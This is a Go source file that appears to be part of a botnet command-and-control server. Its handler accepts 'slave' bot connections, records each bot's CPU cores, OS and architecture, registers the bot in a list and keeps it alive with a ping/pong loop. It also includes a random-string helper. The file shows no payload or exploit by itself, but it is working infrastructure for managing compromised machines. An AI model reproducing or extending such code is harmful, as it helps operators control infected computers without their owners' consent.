package slaves

import (
	"github.com/charmbracelet/log"
	"math/rand"
	"os"
	"server/core/slaves/networking"
	"server/core/slaves/slave"
	"strings"
	"time"
)

var (
	logger = log.NewWithOptions(os.Stderr, log.Options{
		ReportCaller:    true,
		ReportTimestamp: true,
		TimeFormat:      time.Kitchen,
	})
)

func handle(conn *networking.SecureConnection) {
	bot := slave.Slave{
		ID:         slave.Count() + 1,
		Connection: conn,
	}

	defer bot.Connection.Close()
	defer slave.List.Remove(&bot)

	_, err := bot.Read(1024)
	if err != nil {
		return
	}

	cores, err := bot.Read(1024)
	if err != nil {
		return
	}
	osystem, err := bot.Read(1024)
	if err != nil {
		return
	}
	arch, err := bot.Read(1024)
	if err != nil {
		return
	}

	logger.Info("Client authenticated",
		"id", bot.ID,
		"conn", bot.Connection.RemoteAddr().String(),
		"details", strings.Join([]string{
			"Cores: " + cores,
			"Arch: " + arch,
			"OS: " + osystem,
		}, "\n"))

	slave.List.Push(&bot)

	for {
		bot.Write("0")

		pongMessage, err := bot.Read(1024)
		if err != nil {
			break
		}

		if pongMessage != "\x02" {
			break
		}

		time.Sleep(5 * time.Second)
	}

}

var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func RandStringRunes(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}
